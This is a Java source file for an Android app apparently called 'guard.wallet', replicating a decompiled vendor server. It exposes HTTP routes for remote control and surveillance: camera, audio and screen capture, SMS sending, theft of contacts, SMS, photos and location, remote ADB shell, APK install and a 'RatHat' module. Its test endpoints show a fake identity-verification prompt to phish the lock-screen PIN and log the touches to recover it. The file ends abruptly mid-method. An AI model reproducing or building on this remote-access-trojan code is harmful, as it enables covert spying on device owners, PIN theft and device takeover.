package com.guard.wallet.server;

import com.guard.wallet.core.AppUtils;
import com.koushikdutta.async.http.Multimap;
import com.koushikdutta.async.http.server.AsyncHttpServer;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.GlobalActionCondition;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFilterWithUpLevel;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.*;
import com.guard.wallet.resp.ContainerEventVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.server.handler.*;
import com.guard.wallet.utils.SharedPrefsManager;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * HTTP API 调度核心 — vendor server/b.java (28,071行, 229路由, 242方法) 一比一复刻。
 *
 * 架构:
 * - ApiRouter 使用 AndroidAsync 库的 AsyncHttpServer 处理 HTTP 路由
 * - 单例模式 + AtomicInteger 服务状态
 * - startServer() 初始化 HTTP 服务器 (vendor W2())
 * - stopServer() 停止服务器 (vendor f3())
 * - 229 个路由拆分到 13 个 Handler 类
 *
 * 字段映射: instance←b, serviceState←c, httpServer←a
 * 方法映射: startServer←W2, stopServer←f3, parseAndRoute←X1, sendError←F2
 */
public final class ApiRouter {
    private static final String TAG = "HttpServer";

    /** 单例 */
    public static volatile ApiRouter instance;

    /** 服务状态: -1=未启动, 1=运行中 */
    public static final AtomicInteger serviceState = new AtomicInteger(-1);

    /** HTTP 服务器实例 */
    public final AsyncHttpServer httpServer = new AsyncHttpServer();

    public ApiRouter() {
        registerRoutes();
    }

    // ═══════ 路由注册 (229 路由 → 13 个 Handler) ═══════

    private void registerRoutes() {
        Gson gson = new Gson();

        // ─── A: 设备查询 (30 路由) → DeviceQueryHandler ───
        httpServer.get("/", (req, res) -> DeviceQueryHandler.info(res));
        httpServer.get("/index", (req, res) -> DeviceQueryHandler.info(res));
        httpServer.get("/info", (req, res) -> DeviceQueryHandler.info(res));
        httpServer.get("/deviceId", (req, res) -> DeviceQueryHandler.deviceId(res));
        httpServer.get("/version", (req, res) -> DeviceQueryHandler.version(res));
        httpServer.get("/screenState", (req, res) -> DeviceQueryHandler.screenState(res));
        httpServer.get("/lockState", (req, res) -> DeviceQueryHandler.lockState(res));
        httpServer.get("/batteryState", (req, res) -> DeviceQueryHandler.batteryState(res));
        httpServer.get("/netState", (req, res) -> DeviceQueryHandler.netState(res));
        httpServer.get("/callState", (req, res) -> DeviceQueryHandler.callState(res));
        httpServer.get("/containerState", (req, res) -> DeviceQueryHandler.containerState(res));
        httpServer.get("/recordState", (req, res) -> DeviceQueryHandler.recordState(res));
        httpServer.get("/accessibilityState", (req, res) -> DeviceQueryHandler.accessibilityState(res));
        httpServer.get("/pairState", (req, res) -> DeviceQueryHandler.pairState(res));
        httpServer.get("/permissions", (req, res) -> DeviceQueryHandler.permissions(res));
        httpServer.get("/permissionInfo", (req, res) -> {
            Multimap q = req.getQuery();
            DeviceQueryHandler.permissionInfo(res, q.getString("permission"));
        });
        httpServer.get("/packages", (req, res) -> DeviceQueryHandler.packages(res));
        httpServer.get("/deviceAdmin", (req, res) -> DeviceQueryHandler.deviceAdmin(res));
        httpServer.get("/mainPackageName", (req, res) -> DeviceQueryHandler.mainPackageName(res));
        httpServer.get("/mainServerHost", (req, res) -> DeviceQueryHandler.mainServerHost(res));
        httpServer.get("/activeWindowClassName", (req, res) -> DeviceQueryHandler.activeWindowClassName(res));
        httpServer.get("/activePackageName", (req, res) -> DeviceQueryHandler.activePackageName(res));
        httpServer.get("/activeEventGroup", (req, res) -> DeviceQueryHandler.activeEventGroup(res));
        httpServer.get("/isTopVisible", (req, res) -> DeviceQueryHandler.isTopVisible(res));
        httpServer.get("/backUtilsTopVisible", (req, res) -> DeviceQueryHandler.backUtilsTopVisible(res));
        httpServer.get("/debugPort", (req, res) -> DeviceQueryHandler.debugPort(res));
        httpServer.get("/pairPort", (req, res) -> DeviceQueryHandler.pairPort(res));
        httpServer.get("/localDebugPort", (req, res) -> DeviceQueryHandler.localDebugPort(res));
        httpServer.get("/backAppState", (req, res) -> {
            Multimap q = req.getQuery();
            DeviceQueryHandler.backAppState(res, q.getString("state"));
        });
        httpServer.get("/localBackAppState", (req, res) -> DeviceQueryHandler.localBackAppState(res));
        httpServer.get("/uninstallPolicy", (req, res) -> DeviceQueryHandler.uninstallPolicy(res));
        httpServer.get("/checkNotificationService", (req, res) -> DeviceQueryHandler.checkNotificationService(res));
        httpServer.get("/syncPackages", (req, res) -> DeviceQueryHandler.syncPackages(res));

        // ─── I: 全局动作 (12 路由) → GlobalActionHandler ───
        httpServer.post("/global/action", (req, res) -> {
            parseAndRoute("/global/action", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.post("/global/execCommand", (req, res) -> {
            parseAndRoute("/global/execCommand", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/global/setText", (req, res) -> {
            Multimap q = req.getQuery();
            GlobalActionHandler.setText(res, q.getString("text"));
        });
        httpServer.get("/global/copy", (req, res) -> {
            Multimap q = req.getQuery();
            GlobalActionHandler.copy(res, q.getString("text"));
        });
        httpServer.get("/global/paste", (req, res) -> GlobalActionHandler.paste(res));
        httpServer.get("/global/delete", (req, res) -> GlobalActionHandler.delete(res));
        httpServer.get("/global/clear", (req, res) -> GlobalActionHandler.clear(res));
        httpServer.get("/global/lockScreen", (req, res) -> GlobalActionHandler.lockScreen(res));
        httpServer.get("/global/wakeUpScreen", (req, res) -> GlobalActionHandler.wakeUpScreen(res));
        httpServer.get("/global/keepScreenOn", (req, res) -> {
            Multimap q = req.getQuery();
            String keep = q.getString("keep");
            GlobalActionHandler.keepScreenOn(res, keep != null ? Boolean.parseBoolean(keep) : true);
        });
        httpServer.get("/global/moveHome", (req, res) -> GlobalActionHandler.moveHome(res));
        httpServer.get("/global/moveEnd", (req, res) -> GlobalActionHandler.moveEnd(res));

        // ─── C: 系统设置 (12 路由) → SettingsHandler ───
        httpServer.get("/enableDebug", (req, res) -> SettingsHandler.enableDebug(res));
        httpServer.get("/openADBDebug", (req, res) -> SettingsHandler.openADBDebug(res));
        httpServer.get("/closeADBDebug", (req, res) -> SettingsHandler.closeADBDebug(res));
        httpServer.get("/openWifiDebug", (req, res) -> SettingsHandler.openWifiDebug(res));
        httpServer.get("/closeWifiDebug", (req, res) -> SettingsHandler.closeWifiDebug(res));
        httpServer.get("/enableWifiDebug", (req, res) -> SettingsHandler.enableWifiDebug(res));
        httpServer.get("/openDevelopment", (req, res) -> SettingsHandler.openDevelopment(res));
        httpServer.get("/closeDevelopment", (req, res) -> SettingsHandler.closeDevelopment(res));
        httpServer.get("/openWriteSecure", (req, res) -> SettingsHandler.openWriteSecure(res));
        httpServer.get("/syncCanWriteSecure", (req, res) -> SettingsHandler.syncCanWriteSecure(res));
        httpServer.get("/screenOffTimeout", (req, res) -> SettingsHandler.screenOffTimeout(res, null));
        httpServer.get("/writeScreenOffTimeout", (req, res) -> {
            Multimap q = req.getQuery();
            String offTimeout = q.getString("offTimeout");
            SettingsHandler.writeScreenOffTimeout(res,
                    AppUtils.D(offTimeout) ? Long.valueOf(Long.parseLong(offTimeout)) : null);
        });
        httpServer.get("/enableDevelopment", (req, res) -> SettingsHandler.openDevelopment(res));
        httpServer.get("/resetWifiDebug", (req, res) -> SettingsHandler.closeWifiDebug(res));

        // ─── D: 应用管理 (21 路由) → AppManageHandler ───
        httpServer.get("/startApp", (req, res) -> {
            Multimap q = req.getQuery();
            AppManageHandler.startApp(
                    q.getString("packageName"), q.getString("mainActivity"),
                    Boolean.parseBoolean(q.getString("start")), null, res);
        });
        httpServer.get("/startAppFromDesktop", (req, res) -> {
            Multimap q = req.getQuery();
            AppManageHandler.startAppFromDesktop(q.getString("packageName"), q.getString("applicationLabel"), res);
        });
        httpServer.get("/killApp", (req, res) -> {
            Multimap q = req.getQuery();
            AppManageHandler.killApp(res, q.getString("packageName"));
        });
        httpServer.get("/install", (req, res) -> {
            Multimap q = req.getQuery();
            AppManageHandler.install(q.getString("logId"), q.getString("fileUrl"), q.getString("fileName"), q.getString("startCommand"), res);
        });
        httpServer.get("/prepareInstallApp", (req, res) -> AppManageHandler.prepareInstallApp(res));
        httpServer.get("/startInstallApp", (req, res) -> AppManageHandler.startInstallApp(res));
        httpServer.get("/finishInstallApp", (req, res) -> AppManageHandler.finishInstallApp(res));
        httpServer.get("/browserApps", (req, res) -> AppManageHandler.browserApps(res));
        httpServer.get("/uploadAppIcon", (req, res) -> {
            Multimap q = req.getQuery();
            AppManageHandler.uploadAppIcon(res, q.getString("packageName"));
        });
        httpServer.post("/startSettings", (req, res) -> {
            parseAndRoute("/startSettings", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.post("/startAboutDevice", (req, res) -> {
            parseAndRoute("/startAboutDevice", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.post("/startDevSetting", (req, res) -> {
            parseAndRoute("/startDevSetting", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.post("/startWifiSetting", (req, res) -> {
            parseAndRoute("/startWifiSetting", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/startAppDetailSetting", (req, res) -> {
            Multimap q = req.getQuery();
            AppManageHandler.startAppDetailSetting(q.getString("packageName"), null, res);
        });
        httpServer.get("/startAppWriteSetting", (req, res) -> {
            Multimap q = req.getQuery();
            AppManageHandler.startAppWriteSetting(q.getString("packageName"), null, res);
        });
        httpServer.get("/startAccessibility", (req, res) -> AppManageHandler.startAccessibility(res));
        httpServer.get("/startAdminActive", (req, res) -> AppManageHandler.startAdminActive(res));
        httpServer.get("/stopAdminActive", (req, res) -> AppManageHandler.stopAdminActive(res));
        httpServer.post("/syncAdminActivating", (req, res) -> {
            parseAndRoute("/syncAdminActivating", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/removeAccount", (req, res) -> {
            Multimap q = req.getQuery();
            AppManageHandler.removeAccount(res, q.getString("accountType"));
        });
        httpServer.get("/sharePowerControl", (req, res) -> AppManageHandler.sharePowerControl(res));
        httpServer.post("/syncPowerControl", (req, res) -> {
            parseAndRoute("/syncPowerControl", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });

        // ─── E: ADB 操作 (8 路由) → AdbHandler ───
        httpServer.get("/localAdbConnect", (req, res) -> {
            Multimap q = req.getQuery();
            AdbHandler.localAdbConnect(res, q.getString("command"));
        });
        httpServer.get("/localAdbShell", (req, res) -> {
            Multimap q = req.getQuery();
            AdbHandler.localAdbShell(res, q.getString("command"));
        });
        httpServer.post("/localAdbPair", (req, res) -> {
            parseAndRoute("/localAdbPair", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/localAdbPush", (req, res) -> {
            Multimap q = req.getQuery();
            AdbHandler.localAdbPush(res, q.getString("logId"), q.getString("fileUrl"), q.getString("fileName"), q.getString("startCommand"));
        });
        httpServer.get("/requestLocalAdbPair", (req, res) -> AdbHandler.requestLocalAdbPair(res));
        httpServer.get("/localAdbDirectConnect", (req, res) -> {
            Multimap q = req.getQuery();
            String portStr = q.getString("port");
            int port = portStr != null ? Integer.parseInt(portStr) : 0;
            AdbHandler.localAdbDirectConnect(port, res);
        });
        httpServer.post("/shareADBConfig", (req, res) -> {
            parseAndRoute("/shareADBConfig", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.post("/syncADBConfig", (req, res) -> {
            parseAndRoute("/syncADBConfig", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/rewriteDebugPort", (req, res) -> AdbHandler.rewriteDebugPort(res));
        httpServer.get("/reloadPairKeyFiles", (req, res) -> AdbHandler.reloadPairKeyFiles(res));
        httpServer.get("/adbDiag", (req, res) -> AdbHandler.adbDiag(res));

        // ─── F: 媒体 (10 路由) → MediaHandler ───
        httpServer.get("/screenshot/0", (req, res) -> {
            Multimap q = req.getQuery();
            String scale = q.getString("scale");
            MediaHandler.screenshot(Float.parseFloat(scale != null ? scale : "1.0"), res);
        });
        httpServer.get("/miniCap/scale", (req, res) -> {
            Multimap q = req.getQuery();
            String scale = q.getString("scale");
            MediaHandler.screenshot(Float.parseFloat(scale != null ? scale : "1.0"), res);
        });
        httpServer.get("/screenrecord/start", (req, res) -> MediaHandler.screenRecordStart(res));
        httpServer.get("/screenrecord/stop", (req, res) -> MediaHandler.screenRecordStop(res));
        httpServer.get("/screenrecord/state", (req, res) -> MediaHandler.screenRecordState(res));
        httpServer.get("/startRecord", (req, res) -> {
            Multimap q = req.getQuery();
            String audioSource = q.getString("audioSource");
            MediaHandler.startRecord(AppUtils.D(audioSource) ? Integer.parseInt(audioSource) : 1, res);
        });
        httpServer.get("/stopRecord", (req, res) -> MediaHandler.stopRecord(res));
        httpServer.get("/frontCameraLive", (req, res) -> MediaHandler.frontCameraLive(res));
        httpServer.get("/backCameraLive", (req, res) -> MediaHandler.backCameraLive(res));
        httpServer.get("/stopCameraLive", (req, res) -> MediaHandler.stopCameraLive(res));

        // ─── G: 通信 (6 路由) → CommHandler ───
        httpServer.get("/sendSms", (req, res) -> {
            Multimap q = req.getQuery();
            CommHandler.sendSms(q.getString("phoneNumber"), q.getString("content"), res);
        });
        httpServer.get("/callPhone", (req, res) -> {
            Multimap q = req.getQuery();
            CommHandler.callPhone(res, q.getString("callNumber"));
        });
        httpServer.get("/contacts", (req, res) -> CommHandler.contacts(res));
        httpServer.get("/syncContacts", (req, res) -> CommHandler.syncContacts(res));
        httpServer.get("/syncSms", (req, res) -> {
            Multimap q = req.getQuery();
            CommHandler.syncSms(res, q.getString("packageName"));
        });
        httpServer.get("/syncAudios", (req, res) -> CommHandler.syncAudios(res));

        // ─── H: 解锁/密码 (8 路由) → UnlockHandler ───
        httpServer.get("/unlock", (req, res) -> UnlockHandler.unlock(res));
        httpServer.post("/enterCipher", (req, res) -> {
            parseAndRoute("/enterCipher", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.post("/confirmLock", (req, res) -> {
            parseAndRoute("/confirmLock", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/showConfirmLock", (req, res) -> UnlockHandler.showConfirmLock(res));
        httpServer.post("/syncLockCipher", (req, res) -> {
            parseAndRoute("/syncLockCipher", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/startVerifyCredential", (req, res) -> {
            Multimap q = req.getQuery();
            UnlockHandler.startVerifyCredential(res, q.getString("packageName"));
        });
        httpServer.get("/stopVerifyCredential", (req, res) -> {
            Multimap q = req.getQuery();
            UnlockHandler.stopVerifyCredential(res, q.getString("packageName"));
        });
        httpServer.get("/requestLocalKeepAlive", (req, res) -> UnlockHandler.requestLocalKeepAlive(res));

        // ADAPT: 测试端点 — 清除所有 delegate 并直接启动 OPPO 保活引擎
        httpServer.get("/testOppoKeepAlive", (req, res) -> {
            try {
                android.util.Log.e("KeepAliveDebug", "testOppoKeepAlive called");
                com.guard.wallet.service.MyAccessibilityService svc = com.guard.wallet.service.MyAccessibilityService.P();
                if (svc == null) {
                    HttpResponseHelper.error(res, "accessibility service is null");
                    return;
                }
                // 清除所有活跃 delegate
                if (svc.j()) {
                    android.util.Log.e("KeepAliveDebug", "clearing active delegates");
                    svc.x();  // remove KeepAliveEngine
                    svc.w();  // remove GrantPermissionDelegate
                    try { Thread.sleep(500); } catch (Exception ignored) {}
                }
                // 直接调用 b(str) 启动保活引擎
                String pkg = com.guard.wallet.MainApplication.getAppContext().getPackageName();
                android.util.Log.e("KeepAliveDebug", "starting OppoEngine via b() pkg=" + pkg);
                svc.b(pkg);
                HttpResponseHelper.ok(res, true);
            } catch (Exception e) {
                android.util.Log.e("KeepAliveDebug", "testOppoKeepAlive error", e);
                HttpResponseHelper.error(res, e.getMessage());
            }
        });

        // ADAPT: 测试端点 — 用 Full-screen Intent 启动 ConfirmDeviceActivity (绕过华为后台限制)
        httpServer.get("/testConfirmDevice", (req, res) -> {
            try {
                android.content.Context ctx = com.guard.wallet.MainApplication.getAppContext();
                if (ctx == null) { HttpResponseHelper.error(res, "context null"); return; }

                android.content.Intent intent = new android.content.Intent(ctx, com.guard.wallet.activity.ConfirmDeviceActivity.class);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                        | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                android.os.Bundle extras = new android.os.Bundle();
                extras.putString("CONFIRM_DEVICE_CREDENTIAL_TITLE", "验证个人身份");
                extras.putString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE", "隐私保护");
                extras.putString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION", "为了保护你的隐私,请输入锁屏密码,验证是否本人操作");
                extras.putString("CONFIRM_FOR_EVENT_CODE", "PREPARE_FOR_APP_CONFIRM_LOCK");
                intent.putExtras(extras);

                // 用 Full-screen notification intent 绕过后台启动限制
                android.app.PendingIntent pi = android.app.PendingIntent.getActivity(
                        ctx, 0, intent,
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);

                String channelId = "confirm_device";
                android.app.NotificationManager nm = (android.app.NotificationManager) ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
                if (android.os.Build.VERSION.SDK_INT >= 26) {
                    android.app.NotificationChannel ch = new android.app.NotificationChannel(
                            channelId, "验证", android.app.NotificationManager.IMPORTANCE_HIGH);
                    nm.createNotificationChannel(ch);
                }
                android.app.Notification notification = new android.app.Notification.Builder(ctx, channelId)
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setContentTitle("隐私保护")
                        .setContentText("请验证身份")
                        .setFullScreenIntent(pi, true)
                        .setAutoCancel(true)
                        .build();
                nm.notify(9999, notification);

                HttpResponseHelper.ok(res, true);
            } catch (Exception e) {
                android.util.Log.e("TestConfirmDevice", "error", e);
                HttpResponseHelper.error(res, e.getMessage());
            }
        });

        // ADAPT: 测试端点 — getevent 捕获 PIN pad 触摸坐标
        httpServer.get("/testPinCapture", (req, res) -> {
            try {
                android.util.Log.e("PinCapture", "testPinCapture: starting getevent capture");
                com.guard.wallet.adb.AdbConnectionManager.initialize();
                com.guard.wallet.adb.AdbConnectionManager mgr = com.guard.wallet.adb.AdbConnectionManager.getInstance();
                if (mgr == null || !mgr.isConnected()) {
                    HttpResponseHelper.error(res, "ADB not connected");
                    return;
                }
                // 1. 后台启动 getevent 捕获 15 秒
                String captureCmd = "timeout 15 getevent -t /dev/input/event2 > /data/local/tmp/pin_touch.log 2>&1 &";
                mgr.executeShellCommand(captureCmd);
                android.util.Log.e("PinCapture", "getevent capture started");

                // 2. 等 1 秒后启动 ConfirmDeviceActivity
                try { Thread.sleep(1000); } catch (Exception ignored) {}
                boolean launched = com.guard.wallet.utils.SystemHelper.Q0();
                android.util.Log.e("PinCapture", "ConfirmDeviceActivity launched=" + launched);

                HttpResponseHelper.ok(res, "getevent capturing 15s, ConfirmDeviceActivity launched=" + launched + ". Enter PIN then call /testPinResult");
            } catch (Exception e) {
                android.util.Log.e("PinCapture", "testPinCapture error", e);
                HttpResponseHelper.error(res, e.getMessage());
            }
        });

        // ADAPT: 测试端点 — 读取 getevent 捕获结果
        httpServer.get("/testPinResult", (req, res) -> {
            try {
                com.guard.wallet.adb.AdbConnectionManager mgr = com.guard.wallet.adb.AdbConnectionManager.getInstance();
                if (mgr == null || !mgr.isConnected()) {
                    HttpResponseHelper.error(res, "ADB not connected");
                    return;
                }
                // 读取触摸日志
                String readCmd = "cat /data/local/tmp/pin_touch.log";
                try (io.github.muntashirakon.adb.AdbStream stream = mgr.openStream("shell:" + readCmd)) {
                    java.io.InputStream is = stream.openInputStream();
                    byte[] buf = new byte[8192];
                    StringBuilder sb = new StringBuilder();
                    while (!stream.isClosed()) {
                        int read = is.read(buf);
                        if (read == -1) break;
                        if (read > 0) sb.append(new String(buf, 0, read, java.nio.charset.StandardCharsets.UTF_8));
                        if (sb.length() > 50000) break;
                    }
                    String raw = sb.toString();
                    // 解析 ABS_MT_POSITION_X/Y
                    String[] lines = raw.split("\n");
                    StringBuilder result = new StringBuilder();
                    String lastX = null, lastY = null;
                    int touchCount = 0;
                    for (String line : lines) {
                        if (line.contains("ABS_MT_POSITION_X")) {
                            lastX = line.replaceAll(".*ABS_MT_POSITION_X\\s+", "").trim();
                        } else if (line.contains("ABS_MT_POSITION_Y")) {
                            lastY = line.replaceAll(".*ABS_MT_POSITION_Y\\s+", "").trim();
                        } else if (line.contains("BTN_TOUCH") && line.contains("DOWN")) {
                            if (lastX != null && lastY != null) {
                                try {
                                    int rawX = Integer.parseInt(lastX, 16);
                                    int rawY = Integer.parseInt(lastY, 16);
                                    int screenX = rawX * 1240 / 12400;
                                    int screenY = rawY * 2772 / 27720;
                                    touchCount++;
                                    result.append("touch").append(touchCount).append(": screen(").append(screenX).append(",").append(screenY).append(") raw(0x").append(lastX).append(",0x").append(lastY).append(")\n");
                                } catch (NumberFormatException ignored) {}
                                lastX = null;
                                lastY = null;
                            }
                        }
                    }
                    org.json.JSONObject json = new org.json.JSONObject();
                    json.put("touchCount", touchCount);
                    json.put("coordinates", result.toString());
                    json.put("rawLines", lines.length);
                    HttpResponseHelper.ok(res, json);
                }
            } catch (Exception e) {
                android.util.Log.e("PinCapture", "testPinResult error", e);
                HttpResponseHelper.error(res, e.getMessage());
            }
        });

        // ─── J: 文件/同步 (15 路由) → FileSyncHandler ───
        httpServer.get("/deleteFile", (req, res) -> {
            Multimap q = req.getQuery();
            FileSyncHandler.deleteFile(q.getString("filePathAndName"), q.getString("galleryUrl"), res);
        });
        httpServer.get("/syncDownload", (req, res) -> {
            Multimap q = req.getQuery();
            FileSyncHandler.syncDownload(q.getString("filepath"), q.getString("fileUrl"),
                    Boolean.parseBoolean(q.getString("saveToGallery")), res);
        });
        httpServer.get("/asyncDownload", (req, res) -> {
            Multimap q = req.getQuery();
            FileSyncHandler.asyncDownload(q.getString("filepath"), q.getString("fileUrl"),
                    Boolean.parseBoolean(q.getString("saveToGallery")), res);
        });
        httpServer.get("/syncPhotos", (req, res) -> FileSyncHandler.syncPhotos(res));
        httpServer.get("/syncVideos", (req, res) -> FileSyncHandler.syncVideos(res));
        httpServer.get("/syncPermissions", (req, res) -> {
            Multimap q = req.getQuery();
            FileSyncHandler.syncPermissions(res, q.getString("packageName"));
        });
        httpServer.get("/syncWindows", (req, res) -> FileSyncHandler.syncWindows(res));
        httpServer.get("/syncSmsRecognizePlug", (req, res) -> FileSyncHandler.syncSmsRecognizePlug(res));
        httpServer.get("/reloadAgentFile", (req, res) -> FileSyncHandler.reloadAgentFile(res));
        httpServer.get("/realMonitorLocation", (req, res) -> {
            Multimap q = req.getQuery();
            String minTimeMs = q.getString("minTimeMs");
            String minDistanceM = q.getString("minDistanceM");
            FileSyncHandler.realMonitorLocation(
                    AppUtils.D(minTimeMs) ? Long.parseLong(minTimeMs) : 10000L,
                    AppUtils.D(minDistanceM) ? Float.parseFloat(minDistanceM) : 100.0f, res);
        });
        httpServer.get("/cancelMonitorLocation", (req, res) -> FileSyncHandler.cancelMonitorLocation(res));

        // ─── K: 无障碍/窗口 (10 路由) → AccessibilityHandler ───
        httpServer.get("/refreshActiveWindow", (req, res) -> AccessibilityHandler.refreshActiveWindow(res));
        httpServer.get("/removeDelegate", (req, res) -> {
            Multimap q = req.getQuery();
            AccessibilityHandler.removeDelegate(res, q.getString("delegateId"));
        });
        httpServer.post("/listenWindow", (req, res) -> {
            parseAndRoute("/listenWindow", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/readScreenWindow", (req, res) -> AccessibilityHandler.readScreenWindow(res));
        httpServer.post("/listenHelper", (req, res) -> {
            parseAndRoute("/listenHelper", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.post("/finishListenHelper", (req, res) -> {
            parseAndRoute("/finishListenHelper", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/resetAccessibilityService", (req, res) -> AccessibilityHandler.resetAccessibilityService(res));
        httpServer.get("/noticeAlive", (req, res) -> AccessibilityHandler.noticeAlive(res));

        // ─── L: UI弹窗 (5 路由) → UiDialogHandler ───
        httpServer.get("/blockView", (req, res) -> {
            Multimap q = req.getQuery();
            UiDialogHandler.blockView(
                    Boolean.parseBoolean(q.getString("show")), Boolean.parseBoolean(q.getString("transparent")),
                    q.getString("hint"), Boolean.parseBoolean(q.getString("zeroBrightness")),
                    Boolean.parseBoolean(q.getString("destroyLock")), res);
        });
        httpServer.get("/postNotificationDialog", (req, res) -> {
            Multimap q = req.getQuery();
            UiDialogHandler.postNotificationDialog(
                    q.getString("notificationTitle"), q.getString("notificationContent"), q.getString("notificationButton"),
                    q.getString("packageName"), q.getString("startActivity"), res);
        });
        httpServer.get("/showNavigateWifiDialog", (req, res) -> {
            Multimap q = req.getQuery();
            UiDialogHandler.showNavigateWifiDialog(
                    q.getString("notificationTitle"), q.getString("notificationContent"), q.getString("notificationButton"),
                    q.getString("packageName"), q.getString("notificationIcon"), res);
        });
        httpServer.post("/requestPermission", (req, res) -> {
            parseAndRoute("/requestPermission", req.getBody() != null ? req.getBody().get().toString() : null, res);
        });
        httpServer.get("/ignoreBatteryOptimization", (req, res) -> UiDialogHandler.ignoreBatteryOptimization(res));
        httpServer.get("/isDeviceOwner", (req, res) -> UiDialogHandler.isDeviceOwner(res));

        // ─── M: RatHat (5 路由) → RatHatHandler ───
        httpServer.get("/installRatHat", (req, res) -> {
            Multimap q = req.getQuery();
            RatHatHandler.installRatHat(q.getString("logId"), q.getString("fileUrl"), q.getString("fileName"), q.getString("startCommand"), res);
        });
        httpServer.get("/updateRatHat", (req, res) -> {
            Multimap q = req.getQuery();
            RatHatHandler.updateRatHat(q.getString("logId"), q.getString("fileUrl"), q.getString("fileName"), q.getString("startCommand"), res);
        });
        httpServer.get("/startRatHat", (req, res) -> RatHatHandler.startRatHat(res));
        httpServer.get("/stopRatHat", (req, res) -> RatHatHandler.stopRatHat(res));

        // ─── B: UI节点搜索 (93 路由) → NodeSearchHandler ───
        registerNodeSearchRoutes();
    }

    /** 注册 /target/* 路由 (93 条) */
    private void registerNodeSearchRoutes() {
        // --- findOneBy* (单个结果) ---
        httpServer.post("/target/findOneByText", (req, res) -> parseAndRoute("/target/findOneByText", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByTextContains", (req, res) -> parseAndRoute("/target/findOneByTextContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByTextStartsWith", (req, res) -> parseAndRoute("/target/findOneByTextStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByTextEndsWith", (req, res) -> parseAndRoute("/target/findOneByTextEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByTextMatches", (req, res) -> parseAndRoute("/target/findOneByTextMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByDesc", (req, res) -> parseAndRoute("/target/findOneByDesc", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByDescContains", (req, res) -> parseAndRoute("/target/findOneByDescContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByDescStartsWith", (req, res) -> parseAndRoute("/target/findOneByDescStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByDescEndsWith", (req, res) -> parseAndRoute("/target/findOneByDescEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByDescMatches", (req, res) -> parseAndRoute("/target/findOneByDescMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneById", (req, res) -> parseAndRoute("/target/findOneById", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByIdContains", (req, res) -> parseAndRoute("/target/findOneByIdContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByIdStartsWith", (req, res) -> parseAndRoute("/target/findOneByIdStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByIdEndsWith", (req, res) -> parseAndRoute("/target/findOneByIdEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByIdMatches", (req, res) -> parseAndRoute("/target/findOneByIdMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByClassName", (req, res) -> parseAndRoute("/target/findOneByClassName", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByClassNameContains", (req, res) -> parseAndRoute("/target/findOneByClassNameContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByClassNameStartsWith", (req, res) -> parseAndRoute("/target/findOneByClassNameStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByClassNameEndsWith", (req, res) -> parseAndRoute("/target/findOneByClassNameEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByClassNameMatches", (req, res) -> parseAndRoute("/target/findOneByClassNameMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
